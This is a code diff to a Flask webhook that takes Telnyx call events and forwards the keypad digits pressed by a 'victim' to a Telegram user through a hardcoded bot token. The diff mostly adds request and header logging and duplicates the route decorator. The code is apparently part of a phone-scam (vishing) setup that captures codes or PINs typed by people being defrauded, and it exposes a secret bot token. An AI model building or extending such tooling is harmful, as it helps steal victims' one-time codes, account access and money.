@@ -8,24 +8,28 @@ app = Flask(__name__)
 TELEGRAM_BOT_TOKEN = "7823113872:AAEjpmOaB2lq6ubnZCzwM3wa9qvCxw5B1e0"
 
 @app.route('/telnyx_webhook', methods=['POST'])
+@app.route('/telnyx_webhook', methods=['POST'])
 def telnyx_webhook():
-    data = request.json  # Capture the incoming data
-    telegram_user_id = request.args.get('telegram_user_id', None)  # Extract from URL query parameter
-
-    print(f"Received webhook: {data}")
+    # Log the entire request body
+    data = request.json
+    print(f"Received JSON data: {data}")
+    
+    # Log all headers (optional, for debugging)
+    print(f"Headers: {request.headers}")
+    
+    # Log query parameters (in case the telegram_user_id is passed in the URL)
+    telegram_user_id = request.args.get('telegram_user_id', None)
     print(f"Telegram User ID: {telegram_user_id}")
-
+    
     # Extract the digit pressed by the victim
     digit = data.get('digit', None)
-
     if digit:
         print(f"Digit Pressed: {digit}")
-        # Send a direct message to the Telegram user
         send_telegram_message(telegram_user_id, f"The victim pressed: {digit}")
     else:
         print("No digit pressed.")
-
-    return 'OK', 200  # Return acknowledgment
+    
+    return 'OK', 200
 
 
 def send_telegram_message(user_id, message):
